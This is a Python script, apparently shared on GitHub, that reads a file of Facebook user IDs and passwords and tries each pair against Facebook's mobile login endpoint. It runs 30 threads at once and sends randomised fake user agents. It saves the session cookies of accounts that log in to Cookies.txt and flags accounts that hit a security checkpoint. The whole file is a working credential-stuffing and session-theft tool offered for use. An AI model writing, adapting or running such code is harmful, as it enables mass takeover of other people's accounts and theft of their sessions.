import re, random, string, os, sys
from os import system as run
from time import sleep
from concurrent.futures import ThreadPoolExecutor as thread
"""
Coded By Farhan Ali
Don't Copy!
GitHub https://github.com/farhanaliofficial
"""
try:
	import requests
except:
	os.system("pip install requests")

import requests

ids = []
OK = []
CP = []
red = "\033[1;31;40m"
green = "\033[1;32;40m"
white = "\033[0;37;40m"
loop = 0

def get_ua():
	return f"Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S{random.randrange(100, 9999)}/{random.randrange(100, 9999)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.randrange(1, 9)}; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/{random.randrange(1, 9)}.{random.randrange(1, 9)} Mobile WVGA SMM-MMS/1.2.0 OPN-B"

def logo():
	global green, white
	print(f"""    ______            __   _
   / ____/___  ____  / /__(_)__  _____
  / /   / __ \/ __ \/ //_/ / _ \/ ___/
 / /___/ /_/ / /_/ / ,< / /  __(__  )
 \____/\____/\____/_/|_/_/\___/____/
 {green}Coded By Farhan Ali
 @farhanakiofficial{white}""")
	print("-"*40)

def main():
	global ids, OK, CP, red, green, white, loop
	ids.clear()
	OK.clear()
	CP.clear()
	loop = loop * 0
	run("clear")
	logo()
	file_name = input(f" [{green}+{white}] Enter File Name{green}:{white} ")
	try:
		ids.extend(open(file_name,"r").read().splitlines())
	except Exception as e:
		print(f" [{red}X{white}] {str(e)}")
		sleep(.8)
		main()
	with thread(max_workers=30) as FarhanAli:
		for id in ids:
			FarhanAli.submit(_Cookies,id)
	
	print("-"*40)
	print(f" Process Completed\n Cookies are Saved in Cookies.txt{green}!{white}")
	input(" Press Enter to Continue")
	main()

def getCookies(uid,password):
	session = requests.Session()
	_ua = get_ua()
	_fb = session.get('https://m.facebook.com').text
	_data = {
		"lsd": re.search('name="lsd" value="(.*?)"', str(_fb)).group(1),
		"jazoest": re.search('name="jazoest" value="(.*?)"', str(_fb)).group(1),
		"m_ts": re.search('name="m_ts" value="(.*?)"', str(_fb)).group(1),
		"li": re.search('name="li" value="(.*?)"', str(_fb)).group(1),
		"try_number":"0",
		"unrecognized_tries":"0",
		"email": uid,
		"pass": password,
		"login": "Log In"
	}
	_header = {
		'authority': 'p.facebook.com',
		'upgrade-insecure-requests': '1',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'accept-language': 'en-PK,en-GB,en-US;q=0.9,en;q=0.8,en;q=0.7', 
		'dnt': '1', 
		'x-requested-with': 'mark.via.gp', 
		'sec-fetch-site': 'none',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-user': '?1',
		'sec-fetch-dest': 'document',
		'accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
		'cache-control': 'max-age=0',
		'user-agent': _ua
	}
	_res = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=_data,headers=_header).text
	cookies = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
	return cookies

def _Cookies(id):
	global red, green, white, ids, OK, CP, loop
	uid,psw = id.split("|")
	try:
		sys.stdout.write(f'\r %s[%sCOOKIES%s]%s %s%s|%s%s %sOK%s|%sCP %s%s|%s%s%s\r'%(green,white,green,white,loop,green,white,len(ids),white,green,white,len(OK),green,white,len(CP),white));sys.stdout.flush()
		_cookies = getCookies(uid,psw)
		if "c_user" in _cookies:
			print(f" [{green}OK{white}] {uid} {green}|{white} {psw}\n [{green}Cookies{white}] {_cookies}")
			open("Cookies.txt","a").write(uid+"|"+psw+"|"+_cookies+"\n\n")
		elif "checkpoint" in _cookies:
			print(f" [{red}CP{white}] {uid} {red}|{white} {psw}")
		else:
			pass
		loop += 1
	except:
		pass
if __name__ == "__main__":
	main()
